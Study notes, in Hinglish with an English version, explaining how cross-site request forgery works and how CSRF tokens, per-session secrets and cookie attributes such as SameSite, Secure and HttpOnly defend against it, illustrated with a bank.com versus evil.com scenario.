 * ================================
 * COMPLETE CSRF NOTES (Learning Purpose)
 * ================================
 *
 * 1) CSRF KYA HAI?
 * --------------------------------
 * CSRF (Cross-Site Request Forgery) ek attack hai jisme attacker
 * victim ke browser ka use karke kisi trusted website (jaise bank.com)
 * par unwanted request bhej deta hai.
 *
 * Condition:
 * - Victim already login ho
 * - Browser automatically session cookie attach kare
 *
 * --------------------------------------------------
 *
 * 2) CSRF ATTACK KA BASIC FLOW
 * --------------------------------
 * 1. User bank.com par login hai.
 * 2. User evil.com open karta hai.
 * 3. evil.com hidden form ya request ke through bank.com ko POST bhejta hai.
 * 4. Browser automatically bank.com ki cookies attach kar deta hai.
 * 5. Agar CSRF protection nahi hai → attack successful.
 *
 * --------------------------------------------------
 *
 * 3) CSRF PROTECTION KA CORE IDEA
 * --------------------------------
 * Server har user/session ke liye ek unique secret generate karta hai.
 *
 * Is secret se:
 *   - Ek _csrf cookie generate hoti hai (secret store hota hai)
 *   - Ek CSRF token generate hota hai (frontend me use hota hai)
 *
 * Jab request aati hai:
 *   - Server cookie ka secret leta hai
 *   - Request se token leta hai
 *   - Dono ka relation verify karta hai
 *
 * Match → Success
 * Not Match → Reject
 *
 * --------------------------------------------------
 *
 * 4) IMPORTANT SECURITY TRUTH
 * --------------------------------
 * Hacker victim ke browser ka _csrf secret nahi jaanta.
 *
 * Kyun?
 * - Same-Origin Policy
 * - Cookies domain-bound hoti hain
 * - Har user ko alag secret milta hai
 * - Secret random aur cryptographically strong hota hai
 *
 * --------------------------------------------------
 *
 * 5) COOKIE BEHAVIOR (IMPORTANT)
 * --------------------------------
 * Jab request bank.com ko jaati hai:
 *   - Sirf bank.com ki cookies attach hoti hain
 *   - evil.com ki cookies nahi jaati
 *
 * Agar 100 cookies bank.com ki stored hain
 * aur domain + path match karta hai
 * to sab cookies attach ho sakti hain.
 *
 * --------------------------------------------------
 *
 * 6) COOKIE ATTRIBUTES (SECURITY VIEW)
 * --------------------------------
 *
 * Name=Value
 * Domain
 * Path
 * Expires / Max-Age
 * Secure
 * HttpOnly
 * SameSite
 *
 * --------------------------------
 * HttpOnly:
 * - JS se access nahi hoti
 * - XSS me session theft se bachata hai
 *
 * Secure:
 * - Sirf HTTPS me send hoti hai
 *
 * SameSite:
 * - CSRF me helpful
 *
 * SameSite=Strict
 *   → Cross-site request me cookie nahi jayegi
 *
 * SameSite=Lax
 *   → Some cross-site GET me jayegi
 *
 * SameSite=None
 *   → Cross-site me bhi jayegi (Secure required)
 *
 * --------------------------------------------------
 *
 * 7) SameSite vs CSRF Token
 * --------------------------------
 * SameSite:
 *   - Browser-level protection
 *   - Cookie attach hone se pehle check hota hai
 *
 * CSRF Token:
 *   - Server-level verification
 *   - Browser version pe depend nahi karta
 *   - Most reliable protection
 *
 * Real world me dono use kiye jate hain.
 *
 * --------------------------------------------------
 *
 * 8) CORS vs CSRF (CONFUSION CLEAR)
 * --------------------------------
 * CORS:
 *   - JS ko response read karne deta ya block karta hai
 *   - Cookie attach hone ko control nahi karta
 *
 * CSRF:
 *   - Cookie auto-attach behavior ka misuse karta hai
 *
 * Even agar:
 *   app.use(cors())
 * ho,
 * tab bhi CSRF possible hai agar token validation nahi hai.
 *
 * --------------------------------------------------
 *
 * 9) CSRF TOKEN KAHAN SET HOTA HAI?
 * --------------------------------
 * CSRF token frontend me:
 *
 * - Hidden input field me
 * - Meta tag me
 * - JavaScript variable me
 *
 * Example:
 * <input type="hidden" name="_csrf" value="TOKEN">
 *
 * --------------------------------------------------
 *
 * 10) REQUEST ME TOKEN KAHAN SE AA SAKTA HAI?
 * --------------------------------
 * CSRF middleware usually token check karta hai:
 *
 * 1. req.body._csrf
 * 2. req.query._csrf
 * 3. req.headers['csrf-token']
 * 4. req.headers['xsrf-token']
 * 5. req.headers['x-csrf-token']
 * 6. req.headers['x-xsrf-token']
 *
 * Default field name often: "_csrf"
 *
 * --------------------------------------------------
 *
 * 11) DOUBLE SUBMIT COOKIE PATTERN
 * --------------------------------
 * Ek cookie me secret hota hai.
 * Ek token request body/header me hota hai.
 * Server dono compare karta hai.
 *
 * --------------------------------------------------
 *
 * 12) PER USER SECRET CONCEPT
 * --------------------------------
 * Har user/session ke liye:
 *
 * User A → SECRET_A
 * User B → SECRET_B
 * Hacker → SECRET_H
 *
 * Secret alag hone ki wajah se:
 * Hacker ka token victim ke secret se match nahi karega.
 *
 * --------------------------------------------------
 *
 * 13) FINAL SECURITY SETUP (RECOMMENDED)
 * --------------------------------
 *
 * Set-Cookie:
 *   Secure;
 *   HttpOnly;
 *   SameSite=Strict;
 *   Path=/;
 *
 * + CSRF Token Validation
 *
 * Layered security approach use karna chahiye.
 *
 * --------------------------------------------------
 *
 * FINAL CONCLUSION
 * --------------------------------
 * CSRF attack isliye fail hota hai kyunki:
 * Attacker victim ke browser ka secret nahi jaanta.
 *
 * SameSite helpful hai.
 * Lekin CSRF token verification sabse reliable protection hai.
 *

===========================English version========================================

 * Assume there is a website called bank.com where an authentic user has created an account.
 * There is another website called evil.com which is controlled by a hacker.
 *
 * Main Scenario:
 *
 * Step 1:
 * When the user first opens bank.com in the browser,
 * the server generates a _csrf cookie and stores it in the user's browser.
 * At the same time, a CSRF token is generated and inserted into the frontend page.
 *
 * Step 2:
 * The user logs in to bank.com from the same browser.
 * During login, a request is sent to bank.com.
 * Along with this request:
 *   - The previously generated _csrf cookie is automatically sent.
 *   - The CSRF token (from the frontend) is also sent.
 *
 * The server then verifies the relationship between:
 *   - The _csrf cookie (secret)
 *   - The CSRF token
 *
 * If the relation matches → Success
 * If not → Request fails
 *
 * In the authentic user's case, it matches successfully.
 *
 * ---------------------------------------------------------
 *
 * Now consider the attack scenario:
 *
 * The user is already logged in to bank.com.
 * So the user's browser already contains:
 *   - A valid _csrf cookie
 *   - A valid CSRF token (on the frontend)
 *
 * Now the user accidentally opens evil.com.
 *
 * As soon as evil.com loads, it internally sends a request to bank.com.
 * This means a request reaches the bank.com server,
 * but that request originated from evil.com.
 *
 * Suppose the hacker manually sets any random CSRF token
 * in the request header and sends it to bank.com.
 *
 * Now what happens in the browser?
 *
 * The browser checks the destination domain of the request.
 * Since the request is going to bank.com,
 * the browser will attach bank.com cookies (if they exist).
 *
 * So the request received by bank.com server contains:
 *   - A CSRF token created by the hacker (fake token)
 *   - The real _csrf cookie stored in the user's browser
 *
 * Now the server verifies the relation between:
 *   - The secret inside the user's _csrf cookie
 *   - The CSRF token sent in the request
 *
 * This relation will NOT match,
 * because the hacker's token was generated using a different secret.
 *
 * Therefore, the request is rejected.
 *
 * ---------------------------------------------------------
 *
 * Important Observation:
 *
 * The hacker does not know the _csrf secret stored in the user's browser.
 * That secret was generated by bank.com when the frontend was first loaded.
 *
 * If the hacker opens bank.com on his own laptop,
 * bank.com will generate a completely different _csrf cookie and secret for him.
 *
 * Since the secret is different for every user/session,
 * the token generated on the hacker's system will not match
 * the secret stored in the victim user's browser.
 *
 * Conclusion:
 *
 * bank.com generates a different _csrf secret for each user.
 * Because of this, even if the hacker generates a valid token
 * using his own secret, it will not work for another user.



